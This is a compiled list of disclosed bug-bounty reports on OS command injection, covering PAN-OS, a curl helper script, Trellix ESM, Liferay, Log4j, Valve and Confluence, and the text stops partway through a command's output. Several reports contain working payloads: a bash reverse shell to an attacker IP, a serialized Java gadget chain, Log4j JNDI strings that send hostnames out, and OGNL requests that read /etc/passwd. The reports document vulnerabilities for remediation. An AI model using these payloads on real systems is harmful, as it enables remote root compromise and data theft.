# OS Command Injection

_43 reports — High/Critical, disclosed_

### [GlobalProtect - OS Command Injection #█████████](https://hackerone.com/reports/2468496)

- **Report ID:** `2468496`
- **Severity:** Critical
- **Weakness:** OS Command Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @0xr2r
- **Bounty:** - usd
- **Disclosed:** 2026-01-12T19:02:41.698Z
- **CVE(s):** CVE-2024-3400

**Vulnerability Information:**

**Description:**
A command injection vulnerability in the GlobalProtect feature of Palo Alto Networks PAN-OS software for specific PAN-OS versions and distinct feature configurations may enable an unauthenticated attacker to execute arbitrary code with root privileges on the firewall.Cloud NGFW, Panorama appliances, and Prisma Access are not impacted by this vulnerability.



## References
    - https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-CVE-2024-3400/
    - https://attackerkb.com/topics/SSTk336Tmf/cve-2024-3400/rapid7-analysis
    - https://nvd.nist.gov/vuln/detail/CVE-2024-3400

## Impact

GlobalProtect - OS Command Injection

## System Host(s)
██████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
#poc


CVE-2024-3400 Palo Alto OS Command Injection

send this HTTP request:


██████

you will create hellome1337.txt file on the server with root access

now if you try to access the files you should receive 403 insted of 404

███

More Info :
https://github.com/h4x0r-dz/CVE-2024-3400?tab=readme-ov-file
 https://attackerkb.com/topics/SSTk336Tmf/cve-2024-3400/rapid7-analysis https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-cve-2024-3400/

---

### [ OS Command Injection in scripts/firefox-db2pem.sh via untrusted certificate nicknames](https://hackerone.com/reports/3225565)

- **Report ID:** `3225565`
- **Severity:** High
- **Weakness:** OS Command Injection
- **Program:** curl
- **Reporter:** @behindtheblackwall
- **Bounty:** - usd
- **Disclosed:** 2025-06-28T12:19:19.279Z
- **CVE(s):** -

**Vulnerability Information:**

On AI usage: Only for grammar/formatting suggestions/POC code troubleshooting; all vulnerability discovery, POC code creation, and analysis were done manually.

Hey folks, I noticed something I think is worth bringing to you--

scripts/firefox-db2pem.sh helper in the curl source uses

`eval certutil -d "$db" -L -n "$nickname" -a`

to extract each certificate by nickname. Because eval re-parses its arguments, a malicious nickname containing shell syntax (e.g. $(whoami > pwned)) is executed on the host.

Affected Version
-curl master as of June 26 2025 (commit 2a9dfe2), not sure how long this vuln has been in for though.

Steps To Reproduce
1. Install prerequisites

`sudo apt-get install -y libnss3-tools openssl`

2. Create a throw-away profile
`export HOME=$(mktemp -d)`
`PROF="$HOME/.mozilla/firefox/safe.default"`
`mkdir -p "$PROF"`
`certutil -N --empty-password -d "$PROF"`

3. Generate a self-signed cert
`openssl req -x509 -newkey rsa:2048 -nodes \
    -subj '/CN=RCE-Test/' -days 1 \
    -keyout "$HOME/key.pem" -out "$HOME/cert.pem"`

4. Import it with a malicious nickname that runs whoami
`payload='evil$(whoami > pwned)'
certutil -A -d "$PROF" -n "$payload" -t "C,C,C" -i "$HOME/cert.pem"`

5.Verify the nickname is listed
`certutil -L -h 'Builtin Object Token' -d "$PROF"`

6. Run the vulnerable helper
`bash -x scripts/firefox-db2pem.sh "$HOME/ca-bundle.pem" || true`

7. Observe proof file
`cat pwned`

You can also just use my below POC script which I'll attach, but its basically just those steps automated.

Supporting Material / References

    Vulnerable code snippet in scripts/firefox-db2pem.sh:

54  certutil -L -h 'Builtin Object Token' -d "$db" | \
55  grep ' *[CcGTPpu]*,[CcGTPpu]*,[CcGTPpu]* *$' | \
56  sed -e 's/ *[CcGTPpu]*,[CcGTPpu]*,[CcGTPpu]* *$//' -e 's/\(.*\)/"\1"/' | \
57  sort | \
58  while read -r nickname; \
59   do echo "$nickname" | sed -e "s/Builtin Object Token://g"; \
60  eval certutil -d "$db" -L -n "$nickname" -a ; \
61  done >> "$out"

Because the nickname value is substituted into the string that eval executes, any shell metacharacters or command sequences in a nickname will run as part of the shell command.

## Impact

An attacker who can import a certificate into any Firefox NSS database—e.g., their own profile—can achieve arbitrary code execution when scripts/firefox-db2pem.sh is run. In practice, many administrators run this helper as root to generate a system-wide CA bundle, so this bug yields root-level RCE on affected systems.

---

### [Unauthenticated Path Traversal and Command Injection in Trellix Enterprise Security Manager 11.6.10](https://hackerone.com/reports/2817658)

- **Report ID:** `2817658`
- **Severity:** Critical
- **Weakness:** OS Command Injection
- **Program:** Trellix
- **Reporter:** @r4v
- **Bounty:** - usd
- **Disclosed:** 2025-01-12T07:22:07.649Z
- **CVE(s):** -

**Vulnerability Information:**

**Product:** Trellix Enterprise Security Manager (ESM)

**Version Tested:** 11.6.10

**Source:** Publicly available trial version from [Trellix Trials](https://www.trellix.com/downloads/trials/?selectedTab=siem) — "Trellix Enterprise Security Manager, Event Receiver & Log Manager VM for SIEM v11.6.10."

**Potentially Affected Versions:** Latest version could also be vulnerable

**Vulnerability Type:** Path Traversal, Command Injection

**Severity:** Critical

---

## Summary:
A critical vulnerability in Trellix Enterprise Security Manager (ESM) version 11.6.10 allows **unauthenticated** access to the internal `Snowservice` API and enables remote code execution through command injection, executed as the root user. This vulnerability results from multiple flaws in the application's design and configuration, including improper handling of path traversal, insecure forwarding to an AJP backend without adequate validation, and lack of authentication for accessing internal API endpoints.

The root cause lies in the way the ESM forwards requests to the AJP service using `ProxyPass`, specifically configured as:

```apache
ProxyPass         /rs  ajp://localhost:8009/rs
```

This configuration permits unintended external access to internal paths by leveraging the `..;/` traversal sequence, which bypasses typical directory restrictions. This technique is further explained in **Breaking Parser Logic: Take Your Path Normalization Off and Pop 0days Out** by Orange Tsai at Black Hat USA 2018 ([source](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf)). The `..;/` sequence bypasses common path validation checks, making it possible to access restricted internal APIs. Combined with command injection vulnerabilities, this leads to a critical security risk.

---

## Product reports - releases affected:
Wherever possible, please test against the latest released version.
  * Tested on Trellix Enterprise Security Manager version 11.6.10 (Linux)
  * Other versions may also be affected (please verify)

---

## Website reports - browsers verified in:
Please provide the full URL.
  * Tested via HTTP requests (no specific browser required)

---

## Steps to reproduce:
1. Access the `/rs/..;/Snowservice/SnowflexAdminServices/CreateNode` endpoint without authentication to confirm unauthenticated access.
2. Submit a request to the `CreateNode` endpoint to verify unauthorized path traversal access to the internal API.
3. Exploit command injection via the `ManageNode` endpoint to execute commands with root privileges.

### Step 1: Unauthenticated API Access via Path Traversal

The following request demonstrates unauthenticated access to the internal API:

#### Request Example:
```http
POST /rs/..;/Snowservice/SnowflexAdminServices/CreateNode HTTP/1.0
Host: [ESM IP]
Accept: application/json
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36
Content-Length: 118

{
    "serverName": "test132", 
    "ip": "127.0.0.1",
    "port": "1212",
    "peerPort": "1210"
}
```

### Step 2: Remote Code Execution via Command Injection with Root Privileges

The following command injection payload in the `name` parameter provides remote root access:

#### Request Example:
```http
POST /rs/..;/Snowservice/SnowflexAdminServices/ManageNode HTTP/1.0
Host: [ESM IP]
Accept: application/json
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36
Content-Length: 186

{
    "serverName": "test132",
    "processes": [
        {
            "name": "`bash -i >& /dev/tcp/[Attacker IP]/2137 0>&1`", 
            "signal": "Restart"
        }
    ]
}
```

This payload opens a reverse shell to the attacker’s machine, providing root access and full control over the system.

---

## Supporting material/references:
* **Screenshot 1**: screenshot.png - This screenshot shows the HTTP request used to exploit the command injection vulnerability and the reverse shell connection received by the attacker.
* **Screenshot 2**: screenshot2.png - This screenshot displays the process list on the compromised system, showing the injected command being executed as root. It also shows the whole command executed.

---

## Impact

Exploiting this vulnerability allows an attacker to:
- Gain **unauthenticated** access to internal API endpoints through path traversal.
- Execute arbitrary commands as root, compromising the system entirely.

The impact of this vulnerability is rated **Critical** due to the combination of unauthenticated path traversal, insecure proxy forwarding, and command injection.

---

## Recommendations

1. **Secure AJP Proxy Configuration**
   - Review and restrict `ProxyPass` configurations. Ensure that internal paths are only accessible from trusted sources and prevent external access.
   - Avoid using ambiguous path traversal characters like `..;/` by implementing additional path validation for all forwarded requests.

2. **Path Validation and Access Control**
   - Implement robust path validation to reject sequences like `..;/` that enable unauthorized access.
   - Ensure access controls are in place for internal APIs, blocking all unauthorized users and enforcing authentication.

3. **Command Injection Prevention**
   - Enforce strict input sanitization, especially for sensitive parameters like `name`. Reject special characters and command syntax in user inputs.
   - Implement whitelisting of acceptable commands and arguments to prevent arbitrary code execution.

4. **Principle of Least Privilege**
   - Avoid running the service as root to reduce potential damage if an exploit occurs.

---

## Impact Summary

This vulnerability in Trellix ESM 11.6.10 allows **unauthenticated** access to an internal API through path traversal enabled by insecure AJP forwarding and lacks input validation, permitting command injection with root execution. Confirmed on the publicly available trial version, this vulnerability likely affects other versions and requires urgent remediation.

---

## Note to Vendor

It is recommended that Trellix verify which versions of the software are affected by this vulnerability. This issue may not be limited to version 11.6.10 and could impact previous versions as well. A thorough review of historical versions is advised to assess the scope of this vulnerability and ensure proper patching across affected releases.

**Thank you for reviewing this report. I am available for any further questions or additional information.**

**Best Regards,**  
Rafal Gill (r4v)

**Summary (researcher):**

A critical unauthenticated path traversal and command injection vulnerability was identified in Trellix Enterprise Security Manager (ESM) 11.6.10. The ESM's AJP configuration (`ProxyPass /rs ajp://localhost:8009/rs`) allows unauthorized access to internal API endpoints by exploiting a `..;/` path traversal sequence, bypassing directory restrictions. The `/Snowservice/SnowflexAdminServices/ManageNode` endpoint is further vulnerable to command injection in the `name` parameter, allowing remote code execution as root. This vulnerability permits full system compromise via a reverse shell. 

*Tested on version 11.6.10. Other versions may be affected.*

---

### [CVE-2020-7961 RCE Liferay Portal Unauthenticated via https://████████/](https://hackerone.com/reports/2742457)

- **Report ID:** `2742457`
- **Severity:** Critical
- **Weakness:** OS Command Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @exploitmsf
- **Bounty:** - usd
- **Disclosed:** 2024-10-25T15:26:02.667Z
- **CVE(s):** CVE-2020-7961

**Vulnerability Information:**

poc: 
```
POST /api/jsonws/invoke HTTP/1.1
Host: ████████
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0
Content-Length: 4939
Content-Type: application/x-www-form-urlencoded
Referer: https://██████//api/jsonws?contextName=&signature=%2Fexpandocolumn%2Fadd-column-4-tableId-name-type-defaultData
cmd2: systeminfo
Accept-Encoding: gzip

cmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&p_auth=tdmrl&formDate=1597704739243&tableId=1&name=A&type=1&%2BdefaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource=%7B%22userOverridesAsString%22%3A%22HexAsciiSerializedMap%3AACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000023F40000000000001737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B65797400124C6A6176612F6C616E672F4F626A6563743B4C00036D617074000F4C6A6176612F7574696C2F4D61703B7870740003666F6F7372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E7471007E00037870767200206A617661782E7363726970742E536372697074456E67696E654D616E61676572000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000074000B6E6577496E7374616E6365757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007371007E00137571007E00180000000174000A4A61766153637269707474000F676574456E67696E6542794E616D657571007E001B00000001767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707371007E0013757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017404567661722063757272656E74546872656164203D20636F6D2E6C6966657261792E706F7274616C2E736572766963652E53657276696365436F6E746578745468726561644C6F63616C2E67657453657276696365436F6E7465787428293B0A76617220697357696E203D206A6176612E6C616E672E53797374656D2E67657450726F706572747928226F732E6E616D6522292E746F4C6F7765724361736528292E636F6E7461696E73282277696E22293B0A7661722072657175657374203D2063757272656E745468726561642E6765745265717565737428293B0A766172205F726571203D206F72672E6170616368652E636174616C696E612E636F6E6E6563746F722E526571756573744661636164652E636C6173732E6765744465636C617265644669656C6428227265717565737422293B0A5F7265712E73657441636365737369626C652874727565293B0A766172207265616C52657175657374203D205F7265712E6765742872657175657374293B0A76617220726573706F6E7365203D207265616C526571756573742E676574526573706F6E736528293B0A766172206F757470757453747265616D203D20726573706F6E73652E6765744F757470757453747265616D28293B0A76617220636D64203D206E6577206A6176612E6C616E672E537472696E6728726571756573742E6765744865616465722822636D64322229293B0A766172206C697374436D64203D206E6577206A6176612E7574696C2E41727261794C69737428293B0A7661722070203D206E6577206A6176612E6C616E672E50726F636573734275696C64657228293B0A696628697357696E297B0A20202020702E636F6D6D616E642822636D642E657865222C20222F63222C20636D64293B0A7D656C73657B0A20202020702E636F6D6D616E64282262617368222C20222D63222C20636D64293B0A7D0A702E72656469726563744572726F7253747265616D2874727565293B0A7661722070726F63657373203D20702E737461727428293B0A76617220696E70757453747265616D526561646572203D206E6577206A6176612E696F2E496E70757453747265616D5265616465722870726F636573732E676574496E70757453747265616D2829293B0A766172206275666665726564526561646572203D206E6577206A6176612E696F2E427566666572656452656164657228696E70757453747265616D526561646572293B0A766172206C696E65203D2022223B0A7661722066756C6C54657874203D2022223B0A7768696C6528286C696E65203D2062756666657265645265616465722E726561644C696E6528292920213D206E756C6C297B0A2020202066756C6C54657874203D2066756C6C54657874202B206C696E65202B20225C6E223B0A7D0A766172206279746573203D2066756C6C546578742E676574427974657328225554462D3822293B0A6F757470757453747265616D2E7772697465286279746573293B0A6F757470757453747265616D2E636C6F736528293B0A7400046576616C7571007E001B0000000171007E00237371007E000F737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000077080000001000000000787878%3B%22%7D
```
Attacker can read response from system for command systeminfo 
```
Host Name:                █████████
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Server
OS Build Type:             Multiprocessor Free
Registered Owner:        ███████
Registered Organization: ███
Product ID:                00429-70000-00000-AA946
Original Install Date:     8/5/2023, 8:02:29 PM
System Boot Time:          9/25/2024, 11:45:46 AM
System Manufacturer:       Microsoft Corporation
System Model:              Virtual Machine
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2195 Mhz
BIOS Version:              Microsoft Corporation Hyper-V UEFI Release v4.0, 12/17/2019
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     131,071 MB
Available Physical Memory: 123,442 MB
Virtual Memory: Max Size:  146,200 MB
Virtual Memory: Available: 131,089 MB
Virtual Memory: In Use:    15,111 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    ███████
Logon Server:              N/A
Hotfix(s):                 17 Hotfix(s) Installed.
                           [01]: KB5041974
                           [02]: KB4470788
                           [03]: KB4486153
                           [04]: KB4577586
                           [05]: KB5005112
                           [06]: KB5043050
                           [07]: KB5028316
                           [08]: KB5030505
                           [09]: KB5031589
                           [10]: KB5032306
                           [11]: KB5034863
                           [12]: KB5035963
                           [13]: KB5037017
                           [14]: KB5039335
                           [15]: KB5040563
                           [16]: KB5041577
                           [17]: KB5043126
Network Card(s):           2 NIC(s) Installed.
                           [01]: Microsoft Hyper-V Network Adapter
                                 Connection Name: Ethernet 13
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: █████████
                           [02]: Microsoft Hyper-V Network Adapter
                                 Connection Name: Ethernet 14
                                 Status:          Hardware not present
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```
█████

## Impact

Attacker can execute commands on server

## System Host(s)
█████

## Affected Product(s) and Version(s)


## CVE Numbers
CVE-2020-7961

## Steps to Reproduce
I write steps in Description

## Suggested Mitigation/Remediation Actions

---

### [[forum.acronis.com] JNDI Code Injection due an outdated log4j component](https://hackerone.com/reports/1430622)

- **Report ID:** `1430622`
- **Severity:** Critical
- **Weakness:** OS Command Injection
- **Program:** Acronis
- **Reporter:** @godiego
- **Bounty:** - usd
- **Disclosed:** 2024-08-28T09:04:18.391Z
- **CVE(s):** CVE-2021-44228

**Vulnerability Information:**

## Summary

Hi team,

It seems that the machine is affected by the latest CVE-2021-44228 which grants any authenticated user command execution. The vulnerability affects the remote asset forum.acronis.com and this issue allows to remote attackers to perfom Remote Code Execution via JNDI exfiltration.

## Steps To Reproduce

Vulnerable request is: `https://forum.acronis.com/search?s=${j${main:\k5:-Nd}i${spring:k5:-:}ldap://${sys:user.name}-04363f1f3427b48.test3.ggdd.co.uk/}`.

Which generates a pingback exfiltrating the information to my controlled server `ggdd.co.uk`:

{F1551515}

We can see that the system username is `solr`.

## Recommendations

Upgrade Log4j to latest version, 2.1.17.

## Impact

Remote OS command injection via JNDI queries.

---

### [Remote code injection in Log4j on  https://mymtn.mtncongo.net - CVE-2021-44228](https://hackerone.com/reports/1425565)

- **Report ID:** `1425565`
- **Severity:** Critical
- **Weakness:** OS Command Injection
- **Program:** MTN Group
- **Reporter:** @renzi
- **Bounty:** - usd
- **Disclosed:** 2024-08-24T11:55:16.698Z
- **CVE(s):** CVE-2021-44228

**Vulnerability Information:**

###Summary
Hello,

I would to like report this security flaw on https://mymtn.mtncongo.net. Using script nuclei i can found CVE-2021-44228. This is a critical issue cause as remote command execution. On my test i just retrive hostname of machine via nuclei script. (https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-44228.yaml)

###Steps To Reproduce
How we can reproduce the issue;

1. run nuclei script via cmd; ./nuclei -u https://mymtn.mtncongo.net:8443  -t ../nuclei-templates/cves/2021/CVE-2021-44228.yaml

It will retrive the hostname of machine on output " [net]"

Like this;

````
[2021-12-14 03:38:05] [CVE-2021-44228] [http] [critical] https://mymtn.mtncongo.net:8443/?x=${jndi:ldap://${hostName}.c6s11oscca8f9pc2lrggcghbdgeyyyd66.interact.sh/a} [net]
````

###Mitigation
Update according the vendor and thecnical references..

###References
https://www.tenable.com/blog/cve-2021-44228-proof-of-concept-for-critical-apache-log4j-remote-code-execution-vulnerability
https://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476

## Impact

Remote command execution

---

### [Remote code injection in Log4j on http://mtn1app.mtncameroon.net  - CVE-2021-44228](https://hackerone.com/reports/1425563)

- **Report ID:** `1425563`
- **Severity:** Critical
- **Weakness:** OS Command Injection
- **Program:** MTN Group
- **Reporter:** @renzi
- **Bounty:** - usd
- **Disclosed:** 2024-08-24T11:29:12.957Z
- **CVE(s):** CVE-2021-44228

**Vulnerability Information:**

###Summary
Hello,

I would to like report this security flaw on http://mtn1app.mtncameroon.net . Using script nuclei i can found CVE-2021-44228. This is a critical issue cause as remote command execution. On my test i just retrive hostname of machine via nuclei script. (https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-44228.yaml)

###Steps To Reproduce
How we can reproduce the issue;

1. run nuclei script via cmd; ./nuclei -u http://mtn1app.mtncameroon.net:8080/ -t ../nuclei-templates/cves/2021/CVE-2021-44228.yaml

It will retrive the hostname of machine on output " lastic-co1-nodes1.mtnnigeria.net"

Like this;

````
http://mtn1app.mtncameroon.net:8080/?x=${jndi:ldap://${hostName}.c6s11oscca8f9pc2lrggcghbnjyyyybjg.interact.sh/a} [lastic-co1-nodes1.mtnnigeria.net]
````

This vulnerability is on port 8080 and 8443;

* http://mtn1app.mtncameroon.net:8080
* https://mtn1app.mtncameroon.net:8443



###Mitigation
Update according the vendor and thecnical references..

###References
https://www.tenable.com/blog/cve-2021-44228-proof-of-concept-for-critical-apache-log4j-remote-code-execution-vulnerability
https://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476

## Impact

Remote command execution

---

### [Shell command injection in https://partner.steamgames.com/admin/game/publish/ via screenshot URL](https://hackerone.com/reports/949361)

- **Report ID:** `949361`
- **Severity:** Critical
- **Weakness:** OS Command Injection
- **Program:** Valve
- **Reporter:** @njbooher3
- **Bounty:** - usd
- **Disclosed:** 2024-07-30T23:31:39.989Z
- **CVE(s):** -

**Summary (team):**

Insufficient validation of parameters allowed injecting shell metacharacters into values used to construct a Bash command.

**Summary (researcher):**

.

---

### [Shell command injection in https://partner.steamgames.com/bundles/savestore/ via overwriting asset_path_identifier](https://hackerone.com/reports/926169)

- **Report ID:** `926169`
- **Severity:** Critical
- **Weakness:** OS Command Injection
- **Program:** Valve
- **Reporter:** @njbooher3
- **Bounty:** - usd
- **Disclosed:** 2024-07-30T23:30:48.678Z
- **CVE(s):** -

**Summary (team):**

Insufficient validation of parameters allowed injecting shell metacharacters into values used to construct a Bash command.

**Summary (researcher):**

.

---

### [RCE in ███ [CVE-2021-26084]](https://hackerone.com/reports/1327769)

- **Report ID:** `1327769`
- **Severity:** Critical
- **Weakness:** OS Command Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @fdeleite
- **Bounty:** - usd
- **Disclosed:** 2023-12-21T17:47:17.857Z
- **CVE(s):** CVE-2021-26084

**Vulnerability Information:**

In affected versions of Confluence Server and Data Center, an OGNL injection vulnerability exists that would allow an authenticated user, and in some instances an unauthenticated user, to execute arbitrary code on a Confluence Server or Data Center instance. The vulnerable endpoints can be accessed by a non-administrator user or unauthenticated user if ‘Allow people to sign up to create their account’ is enabled. To check whether this is enabled go to COG > User Management > User Signup Options. The affected versions are before version 6.13.23, from version 6.14.0 before 7.4.11, from version 7.5.0 before 7.11.6, and from version 7.12.0

## Impact

-   An unauthenticated, 3rd-party attacker or adversary can execute remote code

## System Host(s)
██████████

## Affected Product(s) and Version(s)


## CVE Numbers
CVE-2021-26084

## Steps to Reproduce
POST
(command cat /etc/passwd)
```
POST /confluence/pages/doenterpagevariables.action HTTP/1.1
Host: ████
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
Accept-Encoding: gzip
Content-Length: 915

queryString=aaaaaaaa\u0027%2b{Class.forName(\u0027javax.script.ScriptEngineManager\u0027).newInstance().getEngineByName(\u0027JavaScript\u0027).\u0065val(\u0027var+isWin+%3d+java.lang.System.getProperty(\u0022os.name\u0022).toLowerCase().contains(\u0022win\u0022)%3b+var+cmd+%3d+new+java.lang.String(\u0022cat /etc/passwd\u0022)%3bvar+p+%3d+new+java.lang.ProcessBuilder()%3b+if(isWin){p.command(\u0022cmd.exe\u0022,+\u0022/c\u0022,+cmd)%3b+}+else{p.command(\u0022bash\u0022,+\u0022-c\u0022,+cmd)%3b+}p.redirectErrorStream(true)%3b+var+process%3d+p.start()%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader(process.getInputStream())%3b+var+bufferedReader+%3d+new+java.io.BufferedReader(inputStreamReader)%3b+var+line+%3d+\u0022\u0022%3b+var+output+%3d+\u0022\u0022%3b+while((line+%3d+bufferedReader.readLine())+!%3d+null){output+%3d+output+%2b+line+%2b+java.lang.Character.toString(10)%3b+}\u0027)}%2b\u0027

```

You will see the output of the ifconfig command

OUTPUT
```
         type="hidden"
          name="queryString"            value="aaaaaaaa[root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
confluence:x:2002:2002::/var/atlassian/application-data/confluence:/bin/bash
]"             />                <input
]"             />
```

## Suggested Mitigation/Remediation Actions

---

### [RCE on ███████ [CVE-2021-26084]](https://hackerone.com/reports/1327701)

- **Report ID:** `1327701`
- **Severity:** Critical
- **Weakness:** OS Command Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @fdeleite
- **Bounty:** - usd
- **Disclosed:** 2023-12-21T17:44:19.496Z
- **CVE(s):** CVE-2021-26084

**Vulnerability Information:**

In affected versions of Confluence Server and Data Center, an OGNL injection vulnerability exists that would allow an authenticated user, and in some instances an unauthenticated user, to execute arbitrary code on a Confluence Server or Data Center instance. The vulnerable endpoints can be accessed by a non-administrator user or unauthenticated user if ‘Allow people to sign up to create their account’ is enabled. To check whether this is enabled go to COG > User Management > User Signup Options. The affected versions are before version 6.13.23, from version 6.14.0 before 7.4.11, from version 7.5.0 before 7.11.6, and from version 7.12.0

## Impact

-   An unauthenticated, 3rd-party attacker or adversary can execute remote code

## System Host(s)
█████

## Affected Product(s) and Version(s)
CVE-2021-26084

## CVE Numbers


## Steps to Reproduce
POST
(command cat /etc/passwd)
```
POST /pages/createpage-entervariables.action?SpaceKey=x HTTP/1.1
Host: ███
Content-Type: application/x-www-form-urlencoded
Content-Length: 915

queryString=aaaaaaaa\u0027%2b{Class.forName(\u0027javax.script.ScriptEngineManager\u0027).newInstance().getEngineByName(\u0027JavaScript\u0027).\u0065val(\u0027var+isWin+%3d+java.lang.System.getProperty(\u0022os.name\u0022).toLowerCase().contains(\u0022win\u0022)%3b+var+cmd+%3d+new+java.lang.String(\u0022cat /etc/passwd\u0022)%3bvar+p+%3d+new+java.lang.ProcessBuilder()%3b+if(isWin){p.command(\u0022cmd.exe\u0022,+\u0022/c\u0022,+cmd)%3b+}+else{p.command(\u0022bash\u0022,+\u0022-c\u0022,+cmd)%3b+}p.redirectErrorStream(true)%3b+var+process%3d+p.start()%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader(process.getInputStream())%3b+var+bufferedReader+%3d+new+java.io.BufferedReader(inputStreamReader)%3b+var+line+%3d+\u0022\u0022%3b+var+output+%3d+\u0022\u0022%3b+while((line+%3d+bufferedReader.readLine())+!%3d+null){output+%3d+output+%2b+line+%2b+java.lang.Character.toString(10)%3b+}\u0027)}%2b\u0027

```

You will see the output of the ifconfig command

OUTPUT
```
      type="hidden"
          name="queryString"            value="aaaaaaaa[root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
